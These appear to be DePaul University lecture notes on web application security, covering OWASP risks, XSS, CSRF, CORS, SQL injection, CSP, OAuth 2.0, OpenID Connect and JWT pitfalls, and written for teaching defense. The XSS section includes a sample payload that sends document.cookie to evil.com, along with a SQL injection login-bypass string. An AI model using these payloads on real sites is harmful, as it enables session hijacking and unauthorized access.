# Security and OAuth/OpenID Connect

# Web Applications | DePaul University

---

## Web Security Fundamentals

Security is a professional responsibility. Authentication, authorization, input handling, dependency management, and token validation are all places where small mistakes can become serious breaches.

Modern web applications are exposed through browsers, APIs, databases, networks, third-party services, dependencies, and authentication providers. Good security depends on understanding where an attacker can interact with the system and how each layer can fail.

---

## Real-World Breach Examples

### Equifax, 2017

- Unpatched Apache Struts vulnerability: CVE-2017-5638
- 147 million records exposed, including Social Security numbers, birth dates, addresses, and driver's license numbers
- More than $700 million in settlements
- Lesson: patch management and dependency scanning are critical

### Capital One, 2019

- Server-Side Request Forgery attack against AWS metadata infrastructure
- 100 million customer records exposed, including 140,000 Social Security numbers
- $80 million fine and $190 million settlement
- Lesson: cloud misconfigurations are a major attack vector

### Log4Shell / Log4j, 2021

- Remote Code Execution vulnerability in the Log4j logging library: CVE-2021-44228
- Affected Java applications across the software ecosystem
- Lesson: dependencies are part of the security boundary

### SolarWinds, 2020

- Supply chain attack that inserted malicious code into SolarWinds Orion updates
- 18,000 organizations affected, including U.S. government agencies
- Lesson: software supply chains require verification, monitoring, and layered trust controls

### T-Mobile, 2023

- API vulnerability exploited over several months
- 37 million customer records exposed
- Lesson: API security requires authentication, authorization, input validation, rate limiting, and monitoring

---

## Attack Surface

```
                    +-------------------------------------+
                    |           ATTACK SURFACE             |
                    +-------------------------------------+

    +----------+         +----------+         +----------+
    | Browser  |<--XSS-->| Server   |<--SQLi->| Database |
    |          |  CSRF   |          | NoSQLi  |          |
    | Client   |<------->| API      |<------->| Store    |
    +----+-----+         +----+-----+         +----------+
         |                    |
    +----v-----+         +----v-----+
    | localStorage |     | Auth     |
    | Cookies      |     | Server   |
    | Session      |     | OAuth    |
    +--------------+     +----------+
         |                    |
         v                    v
    +----------+         +----------+
    | Network  |         | Third    |
    | MITM     |         | Party    |
    | CORS     |         | APIs     |
    +----------+         +----------+
```

---

## Defense in Depth

No single security control is enough. Each layer should reduce risk if another layer fails.

| Security Layer | Web Application Equivalent |
|----------------|----------------------------|
| Perimeter controls | Firewalls and network security |
| Door locks | Authentication |
| Security badges | Authorization |
| Security cameras | Logging and monitoring |
| Safe storage | Encryption at rest |
| Guards | Input validation |
| Alarm system | Intrusion detection |

---

## OWASP Top 10

OWASP stands for the Open Worldwide Application Security Project. It is a nonprofit foundation that publishes free, vendor-neutral resources for improving software security.

The OWASP Top 10 is a widely used list of the most critical security risks for web applications. It gives developers, security teams, and organizations a shared vocabulary for common web application vulnerabilities.

| # | Category | Example |
|---|----------|---------|
| A01 | Broken Access Control | Changing `?user_id=123` to `?user_id=124` to view someone else's data |
| A02 | Cryptographic Failures | Storing passwords in plaintext |
| A03 | Injection | SQL injection that bypasses login or dumps a database |
| A04 | Insecure Design | Password reset flow with no rate limiting |
| A05 | Security Misconfiguration | Default admin credentials left enabled in production |
| A06 | Vulnerable Components | Log4Shell in a vulnerable logging library |
| A07 | Identification and Authentication Failures | Session tokens that never expire |
| A08 | Software and Data Integrity Failures | Deserializing untrusted data that leads to code execution |
| A09 | Security Logging and Monitoring Failures | Authentication failures are not logged, so breaches go undetected |
| A10 | Server-Side Request Forgery | Backend server is tricked into calling an internal metadata endpoint |

Many of the most common web risks are directly connected to authentication, authorization, input handling, dependency management, and configuration.

---

## Cross-Site Scripting

Cross-Site Scripting, or XSS, happens when attacker-controlled content is executed as JavaScript in another user's browser.

### Stored XSS

- Malicious script is saved by the application, often in a database
- Every user who views that stored content is exposed
- Example payload in a comment field:

```html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

### Reflected XSS

- Malicious input is included in a request and reflected immediately in the response
- The victim usually has to click a crafted link
- Example:

```text
https://example.com/search?q=<script>alert('XSS')</script>
```

### DOM-Based XSS

- The payload is processed entirely by client-side JavaScript
- The server may never receive the malicious value
- Vulnerable code example:

```javascript
document.getElementById('output').innerHTML = location.hash.slice(1);
```

Malicious URL example:

```text
https://example.com/page#<img src=x onerror=alert('XSS')>
```

---

## Stored XSS Flow

```
1. Attacker submits a comment:
   "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"

2. Server stores the comment without sanitizing or escaping it.

3. Victim visits the comments page.

4. Server returns the page with the stored comment rendered as HTML.

5. Browser executes the script.

6. Victim's cookies are sent to the attacker's server.

7. Attacker uses the stolen session cookie to impersonate the victim.
```

---

## XSS and Frontend Frameworks

Modern frameworks reduce XSS risk by escaping output by default, but they do not remove the risk entirely.

Risky framework features include:

- React: `dangerouslySetInnerHTML`
- Vue: `v-html`
- Angular: `[innerHTML]` with unsafe content
- Angular: `bypassSecurityTrustHtml()`
- Server-side rendering without proper escaping
- Rich text editors that accept HTML input

For rich text content, use a proven sanitizer such as DOMPurify.

---

## XSS Prevention

- Use template engines and frameworks with automatic escaping
- Render untrusted data as text, not HTML
- Prefer `textContent` over `innerHTML` for user-controlled content
- Use Content Security Policy to limit executable scripts
- Sanitize rich text with a proven sanitizer
- Set session cookies with `HttpOnly`
- Validate and sanitize input on the server

Client-side validation improves user experience, but it is not a security boundary.

---

## Cross-Site Request Forgery

Cross-Site Request Forgery, or CSRF, tricks a logged-in user's browser into sending an unwanted request to a site where the user is already authenticated.

CSRF works because browsers automatically include cookies with requests to the cookie's domain.

---

## CSRF Attack Flow

```
+----------+     1. Login     +--------------+
|          | ---------------> |              |
| User     |                  | Bank.com     |
| Browser  | <--------------- |              |
|          |  2. Session      |              |
|          |     Cookie       +--------------+
|          |                         ^
|          |                         | 4. Browser sends
|          |  3. Visit               |    bank.com cookie
|          |     evil.com            |    automatically
|          | ---------------> +------+-------+
|          |                  | evil.com     |
|          |                  |              |
|          |                  | <form action=|
|          |                  | "bank.com/   |
|          |                  | transfer"    |
|          |                  | method=POST> |
+----------+                  +--------------+
```

The attacker does not need to steal the cookie. The browser sends it automatically if the victim is logged in.

---

## CSRF Prevention

- CSRF tokens: server generates a random token, embeds it in forms, and validates it on submission
- SameSite cookies: `SameSite=Strict` or `SameSite=Lax`
- Origin and Referer checks: verify that state-changing requests came from the expected site

Modern browsers default many cookies to `SameSite=Lax`, which prevents many CSRF attacks. Applications should still use explicit CSRF protection for sensitive state-changing operations.

---

## CORS and Same-Origin Policy

Two URLs have the same origin only when protocol, host, and port match.

| URL A | URL B | Same Origin? | Reason |
|-------|-------|--------------|--------|
| `http://example.com` | `https://example.com` | No | Different protocol |
| `http://example.com` | `http://api.example.com` | No | Different host |
| `http://example.com:3000` | `http://example.com:5000` | No | Different port |

CORS is a browser-enforced policy. It does not protect a server from unauthorized access. Anyone can still call an API using curl, Postman, or server-side code. Servers still need authentication and authorization.

---

## CORS Preflight

```
Browser                              Server
  |                                    |
  |  OPTIONS /api/data                 |
  |  Origin: http://other.com          |
  |  Access-Control-Request-Method:    |
  |    POST                            |
  |----------------------------------->|
  |                                    |
  |  200 OK                            |
  |  Access-Control-Allow-Origin:      |
  |    http://other.com                |
  |  Access-Control-Allow-Methods:     |
  |    GET, POST                       |
  |<-----------------------------------|
  |                                    |
  |  POST /api/data                    |
  |  Origin: http://other.com          |
  |----------------------------------->|
  |                                    |
  |  200 OK + data                     |
  |<-----------------------------------|
```

### Common CORS Mistakes

- Using `Access-Control-Allow-Origin: *` with credentials
- Reflecting the `Origin` header without validation
- Forgetting to handle preflight `OPTIONS` requests
- Treating CORS as a replacement for authentication

---

## SQL Injection

SQL injection happens when untrusted input is inserted directly into a database query.

Vulnerable code:

```javascript
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
```

Attacker input for username:

```text
' OR '1'='1' --
```

Resulting query:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
```

`'1'='1'` is always true, and `--` comments out the rest of the query.

---

## Preventing SQL Injection

Use parameterized queries:

```javascript
const query = `SELECT * FROM users WHERE username = ? AND password = ?`;
db.get(query, [username, password]);
```

ORMs such as Sequelize, Prisma, and TypeORM usually use parameterized queries for normal operations. Raw query methods can still be vulnerable if they concatenate user input.

Vulnerable raw query example:

```javascript
sequelize.query('SELECT * FROM users WHERE name = ' + name);
```

---

## Content Security Policy

Content Security Policy, or CSP, is one of the most important browser security headers for reducing XSS impact.

Example policy:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.googleapis.com;
  frame-ancestors 'none';
```

Start with `default-src 'self'` and add exceptions only as needed.

Helmet.js sets sensible defaults for many common Express security headers.

---

## OAuth 2.0

OAuth 2.0 is an authorization framework. It allows one application to receive limited access to resources owned by a user without receiving the user's password.

Example: a calendar app wants to read a user's Google Calendar events.

Bad pre-OAuth approach:

- The user gives the calendar app their Google password
- The app can access everything the Google account can access
- Access cannot be scoped cleanly
- Revoking access requires changing the password
- The third-party app has to store or handle the password

OAuth approach:

- Google issues the calendar app a limited access token
- The token can be scoped to Calendar access only
- The user can revoke access without changing their password
- The app never sees the user's password
- Tokens can expire automatically

---

## OAuth 2.0 Roles

```
+------------------+     +-------------------+
| Resource Owner   |     | Client            |
| User             |     | SuperCal App      |
+--------+---------+     +---------+---------+
         |                         |
         |                         |
+--------v---------+     +---------v---------+
| Authorization    |     | Resource Server   |
| Server           |     | Google Calendar   |
| Google Login     |     | API               |
+------------------+     +-------------------+
```

| Role | Meaning |
|------|---------|
| Resource Owner | The user who owns the data |
| Client | The application that wants access |
| Authorization Server | The service that authenticates the user and issues tokens |
| Resource Server | The API that hosts the protected resource |

---

## Authorization Code Flow

```
User Browser            Client App              Auth Server             Resource API
     |                      |                       |                       |
1.   | Click Login          |                       |                       |
     | with Google          |                       |                       |
     |--------------------->|                       |                       |
     |                      |                       |                       |
2.   | Redirect to Google   |                       |                       |
     |<---------------------|                       |                       |
     | Location: https://accounts.google.com/o/oauth2/auth                    |
     | ?client_id=SUPERCAL_ID                        |                       |
     | &redirect_uri=https://supercal.com/callback   |                       |
     | &scope=calendar.readonly                      |                       |
     | &state=RANDOM_STRING                          |                       |
     | &response_type=code                           |                       |
     |                      |                       |                       |
3.   | User logs in         |                       |                       |
     |--------------------------------------------->|                       |
     |                      |                       |                       |
4.   | User grants consent  |                       |                       |
     |--------------------------------------------->|                       |
     |                      |                       |                       |
5.   | Redirect back with authorization code          |                       |
     |<---------------------------------------------|                       |
     | Location: https://supercal.com/callback       |                       |
     | ?code=AUTH_CODE_XYZ                           |                       |
     | &state=RANDOM_STRING                          |                       |
     |                      |                       |                       |
6.   |                      | POST /token           |                       |
     |                      | code=AUTH_CODE_XYZ    |                       |
     |                      | client_id=SUPERCAL_ID |                       |
     |                      | client_secret=SECRET  |                       |
     |                      | grant_type=authorization_code                  |
     |                      |---------------------->|                       |
     |                      |                       |                       |
7.   |                      | Token response        |                       |
     |                      | access_token          |                       |
     |                      | refresh_token         |                       |
     |                      | expires_in            |                       |
     |                      | token_type            |                       |
     |                      |<----------------------|                       |
     |                      |                       |                       |
8.   |                      | GET /calendar/events  |                       |
     |                      | Authorization: Bearer access_token             |
     |                      |---------------------------------------------->|
     |                      |                       |                       |
9.   |                      | Calendar event data   |                       |
     |                      |<----------------------------------------------|
     |                      |                       |                       |
10.  | Display events       |                       |                       |
     |<---------------------|                       |                       |
```

Important details:

- The `state` parameter prevents CSRF by tying the callback to the original authorization request
- The authorization code is not an access token
- The authorization code is short-lived and single-use
- The code-for-token exchange happens server to server
- The `client_secret` must never be exposed to browser JavaScript
- Tokens should be handled by the trusted backend whenever possible

---

## OAuth Misconceptions

### OAuth is for login

OAuth is for authorization: what an application can access or do. Authentication requires an identity layer such as OpenID Connect.

### The access token is sent to the browser

In the Authorization Code flow, the authorization code goes through the browser. The server exchanges that code for tokens.

### The Implicit flow is appropriate for SPAs

The Implicit flow is deprecated. It returned access tokens directly in the URL fragment, exposing them to browser history, in-page JavaScript, extensions, and logging tools. Modern SPAs should use Authorization Code with PKCE.

### Custom production authentication is safer because it is simpler

Authentication is difficult to implement securely. Production systems should use established libraries, frameworks, and identity providers.

### A client secret can live in frontend JavaScript

Anything shipped to the browser is visible to users. Client secrets belong on trusted servers only.

---

## PKCE

Proof Key for Code Exchange, or PKCE, protects public clients such as SPAs and mobile apps that cannot safely store a client secret.

PKCE flow:

```
1. Client generates a random string:
   code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

2. Client hashes it:
   code_challenge = SHA256(code_verifier)

3. Authorization request includes:
   code_challenge=E9Mel...
   code_challenge_method=S256

4. Token exchange includes:
   code_verifier=dBjft...

5. Authorization server verifies:
   SHA256(code_verifier) === stored code_challenge
```

PKCE proves that the client exchanging the code is the same client that initiated the authorization request.

---

## OAuth Grant Types

| Grant Type | Use Case | Status |
|------------|----------|--------|
| Authorization Code | Web apps with a backend | Recommended |
| Authorization Code + PKCE | SPAs and mobile apps | Recommended |
| Client Credentials | Machine-to-machine access with no user | Recommended |
| Device Code | Smart TVs, CLI tools, limited-input devices | Specific use cases |
| Implicit | Browser-based token return | Deprecated |
| Resource Owner Password | App directly collects username and password | Deprecated |

---

## OpenID Connect

OpenID Connect, or OIDC, adds authentication to OAuth 2.0.

```text
OAuth 2.0 = Authorization: what can this app do?
OIDC = Authentication: who is this user?
```

OAuth was designed for delegated access. OIDC was created because applications also needed a standard way to identify users.

---

## What OIDC Adds

| Feature | OAuth 2.0 | OIDC |
|---------|-----------|------|
| Authorization | Yes | Yes |
| Authentication | No | Yes |
| ID Token | No | Yes, as a JWT |
| UserInfo endpoint | No | Yes |
| Standard scopes | Custom | `openid`, `profile`, `email` |
| Discovery document | No | Yes, `.well-known/openid-configuration` |
| Session management | No | Yes |

---

## OIDC in the Authorization Code Flow

OIDC uses the same basic OAuth flow, with identity-specific additions.

Authorization request scope:

```text
openid profile email calendar.readonly
```

Token response:

```json
{
  "access_token": "AT_XYZ",
  "refresh_token": "RT_XYZ",
  "id_token": "eyJhbG...",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

Token meanings:

- Access token: used to access APIs
- Refresh token: used to obtain new access tokens
- ID token: used to identify the authenticated user

---

## ID Token Claims

An ID token is usually a JWT.

Header example:

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

Payload example:

```json
{
  "iss": "https://accounts.google.com",
  "sub": "110022334455666",
  "aud": "supercal-client-id",
  "exp": 1700000000,
  "iat": 1699996400,
  "nonce": "abc123",
  "email": "alice@gmail.com",
  "name": "Alice Smith",
  "picture": "https://lh3.googleusercontent.com/photo.jpg"
}
```

Important claims:

- `iss`: issuer; must match the expected identity provider
- `sub`: subject; stable unique user identifier
- `aud`: audience; must match the application's client ID
- `exp`: expiration; must be in the future
- `iat`: issued-at time
- `nonce`: must match the nonce sent in the authorization request

Use `sub` as the stable user key, not email. Email addresses can change.

---

## UserInfo Endpoint

```http
GET https://openidconnect.googleapis.com/v1/userinfo
Authorization: Bearer AT_XYZ
```

Example response:

```json
{
  "sub": "110022334455666",
  "name": "Alice Smith",
  "email": "alice@gmail.com",
  "picture": "https://lh3.googleusercontent.com/photo.jpg",
  "email_verified": true
}
```

The `sub` returned from the UserInfo endpoint should match the `sub` in the ID token.

---

## Standard OIDC Scopes

| Scope | Claims Returned |
|-------|-----------------|
| `openid` | `sub` |
| `profile` | `name`, `family_name`, `given_name`, `picture`, `locale` |
| `email` | `email`, `email_verified` |
| `address` | `address` |
| `phone` | `phone_number`, `phone_number_verified` |

The `openid` scope is required for an OIDC request.

---

## OIDC Misconceptions

### OIDC replaces OAuth

OIDC is built on top of OAuth 2.0. It adds identity information to the OAuth flow.

### Access tokens should identify users

Access tokens are for APIs. ID tokens are for authentication. Some access tokens are opaque and cannot be decoded by the client.

### JWTs are encrypted

JWT payloads are Base64URL encoded, not encrypted. Anyone with the token can read the payload. JWTs are commonly signed so recipients can verify integrity.

Sensitive data such as passwords, Social Security numbers, and secrets should never be placed in JWT payloads.

---

## JSON Web Tokens

A JWT has three parts:

```text
header.payload.signature
```

Example:

```text
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
```

Structure:

```text
Header:    metadata, including algorithm and token type
Payload:   claims about the subject and token
Signature: cryptographic proof that the token was signed by a trusted key
```

---

## JWT Vulnerabilities

### `alg: none`

An attacker changes the algorithm to `none` and removes the signature. Vulnerable servers may accept the token without verification.

### Weak HMAC Secrets

Signing keys such as `secret` or `password` can be brute-forced.

### Missing Expiration

A token without an `exp` claim may remain valid forever.

### Sensitive Data in Payload

JWT payloads are readable by anyone who has the token.

### Key Confusion

A server may incorrectly use an RSA public key as an HMAC secret, allowing an attacker to sign a forged token.

---

## JWT Best Practices

- Use asymmetric algorithms such as RS256 or ES256 for distributed systems
- Use strong 256-bit or larger secrets for HMAC
- Set expiration on access tokens
- Validate signature, expiration, issuer, audience, and nonce where applicable
- Store tokens securely
- Prefer `HttpOnly` cookies over `localStorage` for browser storage

---

## Session-Based Auth vs Token-Based Auth

| Feature | Session-Based | Token-Based |
|---------|---------------|-------------|
| State | Server stores session state | Token contains claims |
| Storage | Session ID in cookie | JWT in cookie or Authorization header |
| Scalability | Requires shared session storage across servers | Can avoid server-side session state |
| Revocation | Easy: delete the session | Harder: use short expiration or a blocklist |
| Size | Small cookie | Larger token |
| CSRF | Cookies are sent automatically | Authorization header avoids many CSRF cases |
| XSS | `HttpOnly` cookies protect session ID | `localStorage` is exposed to JavaScript |
| Common use case | Server-rendered apps and monoliths | APIs, microservices, SPAs, mobile apps |

Session-based authentication is common in server-rendered applications. Token-based authentication is common for APIs, microservices, SPAs, and mobile apps. Many production systems use a hybrid approach.

---

## AI-Generated Auth Code Risks

AI tools can generate insecure authentication code if prompts and reviews do not include security requirements.

### JWTs in `localStorage`

```javascript
localStorage.setItem('token', response.data.token);
```

Any JavaScript running on the page can read `localStorage`, including injected XSS payloads.

### Decoding Without Verifying

```javascript
const payload = JSON.parse(atob(token.split('.')[1]));
```

Decoding a token is not the same as validating its signature.

### Hardcoded Secrets

```javascript
const jwt = sign(payload, 'my-super-secret-key-123');
```

Secrets should come from secure configuration, not source code.

### Missing PKCE

```javascript
window.location = `https://auth.example.com/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=code`;
```

Public clients should use PKCE with `code_challenge` and `code_challenge_method`.

### Missing Expiration Checks

```javascript
fetch('/api/data', { headers: { Authorization: `Bearer ${token}` }});
```

Applications should handle expired tokens and refresh or reauthenticate as appropriate.

---

## Reviewing Auth Code

Review authentication and authorization code for:

- Secure token storage
- Signature validation
- Expiration validation
- Issuer and audience validation
- Nonce validation for OIDC
- Secret management
- PKCE for public OAuth clients
- Secure cookie flags
- CSRF protection
- Rate limiting for login and password reset
- Clear authorization checks on protected resources

---

## Exercise: Vulnerable App

The vulnerable app includes examples of common web security flaws. The goal is to identify the vulnerability, explain the impact, and describe or implement a fix.

Key areas to examine:

- XSS in user-generated content
- CSRF in state-changing requests
- SQL injection in database queries
- Missing or weak security headers
- Insecure authentication or authorization behavior

---

## Homework: Insecure Auth App

The homework focuses on finding and fixing authentication vulnerabilities in an intentionally insecure application.

Core expectations:

- Identify the security flaws
- Fix the vulnerabilities in the application
- Use secure authentication patterns
- Document the vulnerabilities, impact, and fixes
- Implement OAuth or OIDC securely in the course project

---

## Additional Real-World Auth Breaches

### Facebook OAuth Token Leak, 2018

- Access tokens were exposed through a bug in the "View As" feature
- 50 million accounts were affected
- Lesson: tokens in URLs are dangerous, and feature interactions must be tested

### GitHub OAuth Token Theft, 2022

- OAuth tokens were stolen from Heroku and Travis CI integrations
- Private repositories were accessed
- Lesson: OAuth scopes should be limited and tokens should be rotated

### Okta / LAPSUS$, 2022

- A third-party support engineer's laptop was compromised
- 366 organizations were potentially affected
- Lesson: third-party access should be limited and monitored

### Microsoft Exchange ProxyLogon, 2021

- Vulnerability chain allowed unauthenticated remote code execution
- Hundreds of thousands of servers were affected
- Lesson: attackers often chain multiple weaknesses together

---

## Essential References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OAuth 2.0 RFC 6749](https://tools.ietf.org/html/rfc6749)
- [OpenID Connect Core](https://openid.net/specs/openid-connect-core-1_0.html)
- [JWT RFC 7519](https://tools.ietf.org/html/rfc7519)
- [PKCE RFC 7636](https://tools.ietf.org/html/rfc7636)

---

## Tools

- [jwt.io](https://jwt.io/) for decoding and debugging JWTs
- [OAuth.net](https://oauth.net/) for OAuth references
- [OWASP ZAP](https://www.zaproxy.org/) for security testing
- [Burp Suite Community](https://portswigger.net/burp/communitydownload) for web security testing

---

## Web App Security Checklist

- All user input is validated on the server
- Output is encoded or escaped before rendering
- Content Security Policy is configured
- CORS is restricted to trusted origins
- CSRF protection is enabled for state-changing requests
- SQL queries use parameterized statements
- Passwords are hashed with bcrypt or Argon2
- Sessions and tokens expire
- Secrets are stored in environment variables or a secret manager
- HTTPS is enforced in production
- Security headers are configured
- Dependencies are audited regularly
- Authentication uses proven libraries and providers
- JWT signatures are validated
- JWT issuer and audience are validated
- OAuth public clients use PKCE
- Tokens are stored securely
